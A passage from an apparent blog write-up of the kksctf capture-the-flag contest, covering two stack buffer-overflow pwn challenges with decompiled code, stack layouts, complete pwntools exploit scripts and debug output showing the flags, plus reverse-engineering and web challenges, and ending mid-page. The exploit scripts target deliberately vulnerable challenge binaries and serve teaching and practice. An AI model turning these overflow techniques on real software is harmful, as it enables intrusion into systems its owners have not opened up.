class="string">&#x27;/home/pwn/Documents/kksctf/baby_bof&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">(pwn) pwn@ubuntu:~/Documents/kksctf$ ./baby_bof </span><br><span class="line">We have prepared a buffer overflow <span class="keyword">for</span> you</span><br><span class="line">Can you get use of it?</span><br><span class="line">Enter your name: hahaha?</span><br><span class="line">Hello, hahaha?!</span><br><span class="line">(pwn) pwn@ubuntu:~/Documents/kksctf$ </span><br></pre></td></tr></table></figure><p>So open it with IDA32 and press “F5”, we could see the main function’s Pseudocode:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-100h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;We have prepared a buffer overflow for you&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Can you get use of it?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your name: &quot;</span>);</span><br><span class="line">  read_wrapper(&amp;s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s!\n&quot;</span>, &amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The program will ask your name to input, in function read_wrapper, it will use <code>gets</code> function to set the <code>s</code>‘s value to our input:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">read_wrapper</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+0h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="built_in">strlen</span>(s);</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt;= i )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( s[i] &gt; <span class="string">&#x27;@&#x27;</span> &amp;&amp; s[i] &lt;= <span class="string">&#x27;Z&#x27;</span> )</span><br><span class="line">      s[i] += <span class="number">0x20</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>According to this, there is no length limitation for <code>s</code>. And <code>s</code>‘s address is “ebp-100h”, so we can input data like <code>a*0x100 + b*0x4 + jmp_addr</code> to overwrite the return address, and we also can see this in IDA’s Stack Window.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">-00000100 ; D&#x2F;A&#x2F;*   : change type (data&#x2F;ascii&#x2F;array)</span><br><span class="line">-00000100 ; N       : rename</span><br><span class="line">-00000100 ; U       : undefine</span><br><span class="line">-00000100 ; Use data definition commands to create local variables and function arguments.</span><br><span class="line">-00000100 ; Two special fields &quot; r&quot; and &quot; s&quot; represent return address and saved registers.</span><br><span class="line">-00000100 ; Frame size: 100; Saved regs: 4; Purge: 0</span><br><span class="line">-00000100 ;</span><br><span class="line">-00000100</span><br><span class="line">-00000100 s               db ?</span><br><span class="line">-000000FF                 db ? ; undefined</span><br><span class="line">......</span><br><span class="line">-00000003                 db ? ; undefined</span><br><span class="line">-00000002                 db ? ; undefined</span><br><span class="line">-00000001                 db ? ; undefined</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008 argc            dd ?</span><br><span class="line">+0000000C argv            dd ?                    ; offset</span><br><span class="line">+00000010 envp            dd ?                    ; offset</span><br><span class="line">+00000014</span><br><span class="line">+00000014 ; end of stack variables</span><br></pre></td></tr></table></figure><p>Another point is that we should find the <code>jmp_addr</code>, usually  we should make it as the <code>system(&quot;/bin/sh&quot;);</code>,  but in this chall, we can find a function named <code>win()</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">win</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+3h] [ebp-25h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+20h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;unk_8048830);<span class="comment">// &#x27;r&#x27;</span></span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;flag not found&quot;</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">29</span>, stream);</span><br><span class="line">  <span class="keyword">if</span> ( a1 != <span class="number">0xCAFEBABE</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Almost there :)&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Here it comes: %s\n&quot;</span>, &amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>We could see this function will open current working directory’s file “flag.txt”, and check the argument “a1”, if “a1” equal to 0xCAFEBABE, then print the file contents, that’s flag.</p><p>We know that it should firstly push arguments to stack before normally calling a normal function, and the data we input will increase in stack, so the data we should construct is <code>a*0x100 + b*0x4 + win_addr + call_before_next_ins_addr + p32(0xcafebabe)</code>, as the IDA shows,  the win() function start address is 0x80485F6, so the last exploit is:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># for kksctf-baby_bof</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">sh = remote(<span class="string">&quot;tasks.open.kksctf.ru&quot;</span>, <span class="number">10002</span>)</span><br><span class="line"><span class="comment">#sh = process(&quot;./baby_bof&quot;)</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line">win_addr = <span class="number">0x80485f6</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x100</span> + <span class="string">&quot;b&quot;</span>*<span class="number">0x04</span> + p32(win_addr) + p32(<span class="number">0x804850c</span>) + p32(<span class="number">0xCAFEBABE</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Enter your name: &quot;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment"># pause() # to Debug</span></span><br><span class="line">sh.interactive() <span class="comment">#the last line should have, to keep seeing flag.</span></span><br></pre></td></tr></table></figure><p>And run it in terminal:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">(pwn) pwn@ubuntu:~/Documents/kksctf$ python exp.py </span><br><span class="line">[+] Opening connection to tasks.open.kksctf.ru on port 10002: Done</span><br><span class="line">[DEBUG] Received 0x2a bytes:</span><br><span class="line">    <span class="string">&#x27;We have prepared a buffer overflow for you&#x27;</span></span><br><span class="line">[DEBUG] Received 0x29 bytes:</span><br><span class="line">    <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Can you get use of it?\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Enter your name: &#x27;</span></span><br><span class="line">[DEBUG] Sent 0x111 bytes:</span><br><span class="line">    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    *</span><br><span class="line">    00000100  62 62 62 62  f6 85 04 08  0c 85 04 08  be ba fe ca  │bbbb│····│····│····│</span><br><span class="line">    00000110  0a                                                  │·│</span><br><span class="line">    00000111</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[DEBUG] Received 0x119 bytes:</span><br><span class="line">    00000000  48 65 6c 6c  6f 2c 20 61  61 61 61 61  61 61 61 61  │Hell│o, a│aaaa│aaaa│</span><br><span class="line">    00000010  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    *</span><br><span class="line">    00000100  61 61 61 61  61 61 61 62  62 62 62 f6  85 04 08 0c  │aaaa│aaab│bbb·│····│</span><br><span class="line">    00000110  85 04 08 be  ba fe ca 21  0a                        │····│···!│·│</span><br><span class="line">    00000119</span><br><span class="line">Hello, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb��\x0c\x85\x0\xbe\xba\xfe�!</span><br><span class="line">[DEBUG] Received 0x7e bytes:</span><br><span class="line">    <span class="string">&#x27;Here it comes: kks&#123;0v3rf10w_15_my_1!f3&#125;\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;/home/ctf/redir.sh: line 4:    74 Segmentation fault      timeout -k 120 120 ./chall\n&#x27;</span></span><br><span class="line">Here it comes: kks&#123;0v3rf10w_15_my_1!f3&#125;</span><br><span class="line"></span><br><span class="line">/home/ctf/redir.sh: line 4:    74 Segmentation fault      timeout -k 120 120 ./chall</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$  </span><br></pre></td></tr></table></figure><ul><li><strong>flag</strong>: kks{0v3rf10w_15_my_1!f3}</li></ul><h4 id="insane-pwn"><a href="#insane-pwn" class="headerlink" title="insane pwn"></a>insane pwn</h4><p>This is a simple chall so I can solve it. Check the file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(pwn) pwn@ubuntu:~/Documents/kksctf$ file insane_pwn </span><br><span class="line">insane_pwn: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=fd8cb6b2a59db247f16c14859388e6925385e541, not stripped</span><br><span class="line">(pwn) pwn@ubuntu:~/Documents/kksctf$ checksec insane_pwn </span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/Documents/kksctf/insane_pwn&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">(pwn) pwn@ubuntu:~/Documents/kksctf$ </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>It seems all protection are enabled, but let’s look it in IDA. Here is its main function:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+8h] [ebp-114h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+10Ch] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+110h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// [esp+114h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;argc;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  v5 = <span class="number">0xDEADBEEF</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hello! I am x86 vulnerable programm and have and inner buffer size of 256 bites&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Can you lead me to segmentation fault please?&quot;</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">0x108</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">0xDEADBEEF</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hit me harder!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    print_flag();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Clearly, we can see if the <code>v5</code> variable is not equal to 0xDEADBEEF, then it will go to print_flag func to print flag. But the code above set <code>v5</code> to 0xDEADBEEF, and we also could see that func truely print flag:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">print_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [esp+8h] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+Fh] [ebp-29h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Thank you! you can have your flag: &quot;</span>);</span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( stream )</span><br><span class="line">  &#123;</span><br><span class="line">    fgets(&amp;s, <span class="number">29</span>, stream);</span><br><span class="line">    <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">    fclose(stream);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;flag not found&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>So our target is to input something to overflow the <code>v5</code> variable. According to main func, we know that <code>s</code> variable is in <code>[ebp-114h]</code>, and <code>v5</code> variable is in <code>[ebp-10h]</code>, so their distance is 0x104. Main func use <code>fgets</code> func to get our input, and it has length limitation(0x108), therefore our payload will be <code>&#39;a&#39;*0x104 + &#39;aa&#39;</code>, then the <code>v5</code> variable will be 0xCAFE6161. So the last exploit is:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># for kksctf-insane_pwn</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">sh = remote(<span class="string">&quot;tasks.open.kksctf.ru&quot;</span>, <span class="number">10003</span>)</span><br><span class="line"><span class="comment">#sh = process(&quot;./insane_pwn&quot;)</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x104</span> + <span class="string">&quot;aa&quot;</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;Can you lead me to segmentation fault please?&quot;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>And the result is:</p><p><img src="/2019/12/30/kksctf-writeup/flag.png" alt="flag"></p><ul><li><strong>flag</strong>: kks{W0w_th15_w@5_4w350m3}</li></ul><h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><h4 id="Buffalo-reverse"><a href="#Buffalo-reverse" class="headerlink" title="Buffalo reverse"></a>Buffalo reverse</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-94h]</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">32</span>]; <span class="comment">// [rsp+10h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">104</span>]; <span class="comment">// [rsp+30h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please, enter password for decryption: &quot;</span>, argv, envp);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(s) == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Decrypting, please wait...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">17</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v5[i] = crypto_data[i] ^ s[i % <span class="number">8</span>];</span><br><span class="line">      <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;0x%02x ^ 0x%02x = 0x%02x %c\n&quot;</span>,</span><br><span class="line">        crypto_data[i],</span><br><span class="line">        (<span class="keyword">unsigned</span> __int8)s[i % <span class="number">8</span>],</span><br><span class="line">        (<span class="keyword">unsigned</span> __int8)v5[i],</span><br><span class="line">        (<span class="keyword">unsigned</span> __int8)v5[i]);</span><br><span class="line">      sleep(<span class="number">1u</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your flag is: %s\n&quot;</span>, v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Password don&#x27;t match.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Easy to understand, it’s xor decrypt. But the password needs us to brute, the description said the flag is embeed with brackets, so we can guess the last character is “}”, because the key length is 8, so we can expand and then know the flag is like “<code>*l*******b*******&#125;</code>“, we can guess the first 5 characters are “<code>flag&#123;</code>“, so the flag is like “<code>flag&#123;***_brut***e&#125;</code>“, but then we couldn’t get more, and now we know the key is “deadb***”. At last we need to read the description again, it said:</p><blockquote><p>Buffalo dead while reversing this task.</p></blockquote><p>there is a brainfuck idea: dead buffalo, so the key is “deadbeef”, and that’s an interesting value.</p><p>So the flag:</p><p><img src="/2019/12/30/kksctf-writeup/TIM%E6%88%AA%E5%9B%BE20191228175539.png" alt="TIM截图20191228175539"></p><h4 id="Xmas-Tree-2"><a href="#Xmas-Tree-2" class="headerlink" title="Xmas Tree 2"></a>Xmas Tree 2</h4><p>It gives us the source code, and it get a value from argv[1], that’s the main function’s first parameter. And then check the value with 5 <code>if</code> conditions, if all are right, then print the flag through decoding.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> data_1[<span class="number">20</span>] = <span class="string">&quot;_a&quot;</span><span class="string">&quot;cd&quot;</span><span class="string">&quot;eh&quot;</span><span class="string">&quot;ik&quot;</span><span class="string">&quot;lm&quot;</span><span class="string">&quot;no&quot;</span><span class="string">&quot;pr&quot;</span><span class="string">&quot;su&quot;</span><span class="string">&quot;wy&quot;</span><span class="string">&quot;\0&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (argc &lt; <span class="number">2</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> key = atoi (argv[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">if</span> (((<span class="keyword">unsigned</span> <span class="keyword">char</span>*)&amp;key)[<span class="number">0</span>] == <span class="number">0xAF</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (((<span class="keyword">short</span>*)&amp;key)[<span class="number">1</span>] == <span class="number">0x3174</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (((key &gt;&gt; <span class="number">22</span>) &amp; <span class="number">0xFF</span>) == <span class="number">0xC5</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (*(((<span class="keyword">char</span>*)((&amp;key) + <span class="number">2</span>)) - <span class="number">7</span>) == <span class="number">0x19</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (((((<span class="keyword">short</span>*)(((<span class="keyword">char</span>*)(&amp;key)) + <span class="number">13</span>) - <span class="number">5</span>)[<span class="number">0</span>] &gt;&gt; <span class="number">0</span>) &amp; <span class="number">0xff</span>) == <span class="number">0x31</span>) &#123;</span><br></pre></td></tr></table></figure><p>It’s easy to get the value from these 5 <code>if</code> conditions, the first byte is <code>0xAF</code>, and the last 2 bytes’ value is <code>0x3174</code>, the second byte is <code>0x19</code>, and it’s little endian code, so the value is <code>0x317419AF</code>, this value moves to right in 22 bits, also satisfy the third codition <code>0xC5</code>, the last condition mean the last byte is <code>0x31</code>, I seems like that:</p><p><img src="/2019/12/30/kksctf-writeup/IMG_20200103_211413.jpg" alt="IMG_20200103_211413"></p><p>And finally, <code>0x317419AF</code> convert to decimal is <code>829692335</code>, the flag is:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ gcc task_tree.c</span><br><span class="line"></span><br><span class="line">name@Desktop /cygdrive/e/kksctf/reverse/Xmas Tree 2</span><br><span class="line">$ ./a.exe 829692335</span><br><span class="line">kks&#123;c_is_simple_only_when_you_are_drunk&#125;</span><br><span class="line"></span><br><span class="line">name@Desktop /cygdrive/e/kksctf/reverse/Xmas Tree 2</span><br><span class="line">$</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>flag: kks{c_is_simple_only_when_you_are_drunk}</li></ul><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="Postman"><a href="#Postman" class="headerlink" title="Postman"></a>Postman</h4><p>Find the directory <code>/postbox</code> in robots.txt, then change the method from GET to POST, then you can get the flag.</p><p><img 